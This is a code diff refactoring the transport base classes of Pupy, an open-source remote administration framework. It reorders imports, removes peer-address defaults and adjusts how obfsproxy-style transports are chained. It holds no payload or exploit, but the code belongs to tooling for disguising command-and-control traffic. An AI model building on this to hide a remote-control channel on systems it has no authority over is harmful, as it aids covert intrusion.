@@ -2,11 +2,19 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
+from buffer import Buffer
+from network.lib import getLogger
+
+logger = getLogger('chain')
+
+
 class ReleaseChainedTransport(Exception):
     __slots__ = ()
 
+
 class TransportSetupFailed(Exception):
     __slots__ = ()
+
 
 class BasePupyTransport(object):
     __slots__ = (
@@ -16,11 +24,8 @@ class BasePupyTransport(object):
 
     def __init__(self, stream, **kwargs):
         if stream is None:
-            upstream_peer = kwargs.get('upstream_peer', ("127.0.0.1", 443))
-            downstream_peer = kwargs.get('downstream_peer', ("127.0.0.1", 443))
-
-            self.downstream = Buffer(transport_func=addGetPeer(downstream_peer))
-            self.upstream = Buffer(transport_func=addGetPeer(upstream_peer))
+            self.downstream = Buffer()
+            self.upstream = Buffer()
             self.stream = None
         else:
             self.downstream = stream.downstream
@@ -98,21 +103,19 @@ class BasePupyTransport(object):
             """ obfsproxy style alias """
         raise NotImplementedError()
 
+
 class BaseTransport(BasePupyTransport):
     """ obfsproxy style alias """
     __slots__ = ()
 
+
 class TransportError(Exception):
     __slots__ = ()
+
 
 class PluggableTransportError(Exception):
     __slots__ = ()
 
-from buffer import Buffer
-from streams.PupySocketStream import addGetPeer
-
-from network.lib import getLogger
-logger = getLogger('chain')
 
 class TransportWrapper(BasePupyTransport):
 
@@ -122,11 +125,6 @@ class TransportWrapper(BasePupyTransport):
 
     def __init__(self, stream, **kwargs):
         super(TransportWrapper, self).__init__(stream, **kwargs)
-
-        kwargs.update({
-            'upstream_peer': self.upstream.transport.peer,
-            'downstream_peer': self.downstream.transport.peer
-        })
 
         self.chain = [
             klass(None, **kwargs) for klass in self.__class__._linearize()
@@ -206,6 +204,7 @@ class TransportWrapper(BasePupyTransport):
             data.write_to(self.downstream)
         else:
             self.chain[idx].upstream_recv(data)
+
 
 def chain_transports(*args):
     """ chain 2 or more transports in such a way that the first argument is the transport seen at network level like t1(t2(t3(...(raw_data)...)))"""
